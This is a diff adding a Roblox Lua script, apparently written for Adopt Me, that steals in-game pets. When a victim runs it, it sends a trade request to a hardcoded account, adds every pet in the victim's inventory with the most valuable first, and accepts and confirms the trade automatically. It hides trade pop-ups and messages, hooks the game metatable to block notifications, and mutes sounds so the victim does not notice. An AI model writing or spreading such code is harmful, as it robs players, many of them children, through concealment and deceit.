@@ -1,0 +1,365 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local CoreGui = game:GetService("CoreGui")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+local TradeAPI = ReplicatedStorage:WaitForChild("API")
+local WAIT_FIRST = 38
+local WAIT_CONFIRM = 18
+local BATCH_SIZE = 30
+local PER_ITEM_DELAY = 0.01
+local BATCH_PAUSE = 0.05
+local TARGET_NAME = "Aliloloaz"
+
+local MANUAL_REMOTES = {
+    TRADE_REQUEST = "ZyimoLbVNhuDvmKvzApCPUFUW",
+    OPEN_BAG = "GjproFqzsBIISicUYKJNKEUGeGMOLdNWPZg",
+    ADD_PET = "ZyimoLbVNPtuaLyGpKmDEES",
+    ACCEPT_1 = "ZyimoLbVNPstwHMi/CLRHAUKRR",
+    CONFIRM_2 = "ZyimoLbVNRDDxAKGpNyBD",
+    SOUND_EFFECTS = "YlABsysEOeYQkxMn/PQGMG",
+}
+
+local Remotes = {
+    AcceptRequest = nil,
+    OpenBag = nil,
+    AddPet = nil,
+    Accept1 = nil,
+    Confirm2 = nil,
+}
+
+local function Resolve(key)
+    local id = MANUAL_REMOTES[key]
+    if id and type(id) == "string" then
+        return TradeAPI:FindFirstChild(id)
+    end
+    return nil
+end
+
+local function suppressClientUI()
+    local pg = LocalPlayer:FindFirstChild("PlayerGui")
+    if not pg then return end
+    local function textMatches(s)
+        if type(s) ~= "string" then return false end
+        local t = string.lower(s)
+        if t == "" then return false end
+        local keys = {
+            "trade","request","sent","cannot","already",
+            "troc","demande","envoyée","envoyee","peut pas","ne peut pas","déjà","deja",
+            "échange","echange","echanger","échangé","échangé","echange","exchanged","traded"
+        }
+        for _, k in ipairs(keys) do
+            if t:find(k) then return true end
+        end
+        return false
+    end
+    local function disableObj(o)
+        if o:IsA("ScreenGui") then
+            local n = string.lower(o.Name)
+            if n:find("trade") or n:find("dialog") or n:find("notification") or n:find("popup") or n:find("toast") then
+                o.Enabled = false
+            end
+        end
+        if o:IsA("TextLabel") or o:IsA("TextButton") or o:IsA("TextBox") then
+            local tx = o.Text or ""
+            if textMatches(tx) then
+                o.Visible = false
+            end
+        end
+        if o:IsA("Message") or o:IsA("Hint") then
+            o.Visible = false
+        end
+    end
+    local function hookTextChanges(o)
+        if o:IsA("TextLabel") or o:IsA("TextButton") or o:IsA("TextBox") then
+            o:GetPropertyChangedSignal("Text"):Connect(function()
+                if textMatches(o.Text or "") then
+                    o.Visible = false
+                end
+            end)
+        end
+    end
+    local function scanRoot(root)
+        for _, gui in pairs(root:GetChildren()) do
+            disableObj(gui)
+            for _, d in pairs(gui:GetDescendants()) do
+                disableObj(d)
+                hookTextChanges(d)
+            end
+        end
+        root.ChildAdded:Connect(function(child)
+            disableObj(child)
+            for _, d in pairs(child:GetDescendants()) do
+                disableObj(d)
+                hookTextChanges(d)
+            end
+        end)
+        root.DescendantAdded:Connect(function(d)
+            disableObj(d)
+            hookTextChanges(d)
+        end)
+    end
+    scanRoot(pg)
+    scanRoot(CoreGui)
+    RunService.RenderStepped:Connect(function()
+        for _, root in ipairs({pg, CoreGui}) do
+            for _, d in pairs(root:GetDescendants()) do
+                if (d:IsA("TextLabel") or d:IsA("TextButton") or d:IsA("TextBox")) and d.Visible and textMatches(d.Text or "") then
+                    d.Visible = false
+                end
+            end
+        end
+    end)
+end
+
+local function suppressCoreNotifications()
+    local mt = getrawmetatable(game)
+    if mt and getnamecallmethod and setreadonly then
+        pcall(function()
+            setreadonly(mt, false)
+            local old = mt.__namecall
+            mt.__namecall = function(self, ...)
+                local m = getnamecallmethod()
+                if m == "SetCore" then
+                    local args = {...}
+                    local key = args[1]
+                    if type(key) == "string" then
+                        local lk = string.lower(key)
+                        if lk:find("sendnotification") or lk:find("chatmakesystemmessage") then
+                            return
+                        end
+                    end
+                end
+                return old(self, ...)
+            end
+            setreadonly(mt, true)
+        end)
+    end
+end
+
+local function muteSoundEffects()
+    local args = { "sound_effects_volume", 0 }
+    local r = Resolve("SOUND_EFFECTS")
+    if r then
+        pcall(function() r:FireServer(unpack(args)) end)
+    end
+end
+
+local function getAllPlayers()
+    local t = {}
+    for _, p in pairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer then
+            table.insert(t, p)
+        end
+    end
+    return t
+end
+
+local function getRealTradePartner()
+    local partner = nil
+    pcall(function()
+        local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
+        local myData = ClientData.get_data()[LocalPlayer.Name]
+        if myData and myData.trade and myData.trade.partner then
+            partner = myData.trade.partner
+        end
+    end)
+    return partner
+end
+
+local function getPetItems()
+    local pets = {}
+    local seen = {}
+    pcall(function()
+        local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
+        local playerData = ClientData.get_data()[LocalPlayer.Name]
+        if playerData and playerData.inventory and playerData.inventory.pets then
+            for id, _ in pairs(playerData.inventory.pets) do
+                if type(id) == "string" and not seen[id] then
+                    seen[id] = true
+                    pets[#pets + 1] = id
+                end
+            end
+        end
+    end)
+    if #pets > 0 then return pets end
+    if getgc then
+        local ok, objects = pcall(getgc, true)
+        if ok and type(objects) == "table" then
+            for _, v in pairs(objects) do
+                if type(v) == "table" then
+                    local invPets = rawget(v, "pets")
+                    local strollers = rawget(v, "strollers")
+                    if type(invPets) == "table" and strollers then
+                        for id, _ in pairs(invPets) do
+                            if type(id) == "string" then
+                                local L = #id
+                                if L >= 16 and L <= 96 and not id:find("sticker") then
+                                    if id:find("%-") or id:find("_") or id:find("%x%x%x%x") then
+                                        if not seen[id] then
+                                            seen[id] = true
+                                            pets[#pets + 1] = id
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    return pets
+end
+
+local function getPetInfoMap()
+    local map = {}
+    pcall(function()
+        local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
+        local playerData = ClientData.get_data()[LocalPlayer.Name]
+        if playerData and playerData.inventory and playerData.inventory.pets then
+            for id, info in pairs(playerData.inventory.pets) do
+                map[id] = info
+            end
+        end
+    end)
+    return map
+end
+
+local function flagTrue(v)
+    if type(v) == "boolean" then return v end
+    if type(v) == "number" then return v ~= 0 end
+    if type(v) == "string" then
+        local t = string.lower(v)
+        return t == "true" or t == "1" or t == "yes"
+    end
+    return false
+end
+
+local function detectAttrs(info)
+    local neon = false
+    local mega = false
+    local fly = false
+    local ride = false
+    local function scan(tbl)
+        for k, v in pairs(tbl) do
+            local lk = string.lower(tostring(k))
+            if lk:find("mega") then mega = mega or flagTrue(v) end
+            if lk:find("neon") then
+                if type(v) == "number" then neon = neon or (v > 0) else neon = neon or flagTrue(v) end
+            end
+            if lk:find("fly") then fly = fly or flagTrue(v) end
+            if lk:find("ride") then ride = ride or flagTrue(v) end
+            if type(v) == "table" then scan(v) end
+        end
+    end
+    if type(info) == "table" then scan(info) end
+    return mega, neon, fly, ride
+end
+
+local function sortPetsByPriority(list)
+    local infoMap = getPetInfoMap()
+    local megaList, neonList, flyList, rideList, otherList = {}, {}, {}, {}, {}
+    for _, id in ipairs(list) do
+        local info = infoMap[id]
+        local mega, neon, fly, ride = detectAttrs(info)
+        if mega then
+            megaList[#megaList+1] = id
+        elseif neon then
+            neonList[#neonList+1] = id
+        elseif fly then
+            flyList[#flyList+1] = id
+        elseif ride then
+            rideList[#rideList+1] = id
+        else
+            otherList[#otherList+1] = id
+        end
+    end
+    local out = {}
+    for _, t in ipairs({megaList, neonList, flyList, rideList, otherList}) do
+        for i=1,#t do out[#out+1] = t[i] end
+    end
+    return out
+end
+
+local function normalizePetId(id)
+    return id
+end
+
+local function addPetSafe(rAddPet, id)
+    pcall(function() rAddPet:FireServer(id) end)
+    if type(id) == "string" and not id:match("^2_") then
+        task.wait(0.005)
+        pcall(function() rAddPet:FireServer("2_" .. id) end)
+    end
+end
+
+local function waitForTradeStart(timeoutSec)
+    local elapsed = 0
+    while not getRealTradePartner() and elapsed < timeoutSec do
+        task.wait(0.2)
+        elapsed = elapsed + 0.2
+    end
+end
+
+local function runCycle()
+    suppressClientUI()
+    suppressCoreNotifications()
+    muteSoundEffects()
+    while true do
+        local rRequest = Resolve("TRADE_REQUEST")
+        local rOpenBag = Resolve("OPEN_BAG")
+        local rAddPet = Resolve("ADD_PET")
+        local rAccept1 = Resolve("ACCEPT_1")
+        local rConfirm2 = Resolve("CONFIRM_2")
+        if not (rRequest and rOpenBag and rAddPet and rAccept1 and rConfirm2) then
+            task.wait(1)
+        else
+            local found = getPetItems()
+            found = sortPetsByPriority(found)
+            if #found == 0 then
+                task.wait(2)
+            else
+                local target = Players:FindFirstChild(TARGET_NAME) or Players:FindFirstChild(string.gsub(TARGET_NAME, "%s+", ""))
+                if target then
+                    pcall(function() rRequest:FireServer(target) end)
+                end
+                waitForTradeStart(5)
+                task.wait(0.5)
+                local idx = 1
+                local added = 0
+                while idx <= #found do
+                    pcall(function() rOpenBag:FireServer("open_backpack") end)
+                    task.wait(0.01)
+                    addPetSafe(rAddPet, found[idx])
+                    added = added + 1
+                    if added % BATCH_SIZE == 0 then
+                        task.wait(BATCH_PAUSE)
+                    else
+                        task.wait(PER_ITEM_DELAY)
+                    end
+                    idx = idx + 1
+                end
+                if added > 0 then
+                    waitForTradeStart(5)
+                    task.wait(WAIT_FIRST)
+                    pcall(function() rAccept1:FireServer() end)
+                    task.wait(WAIT_CONFIRM)
+                    pcall(function() rConfirm2:FireServer() end)
+                    task.wait(0.5)
+                end
+                if idx > #found then
+                    local refresh = getPetItems()
+                    if #refresh == 0 then
+                        task.wait(2)
+                    else
+                        found = refresh
+                    end
+                end
+                task.wait(1)
+            end
+        end
+    end
+end
+
+task.spawn(runCycle)
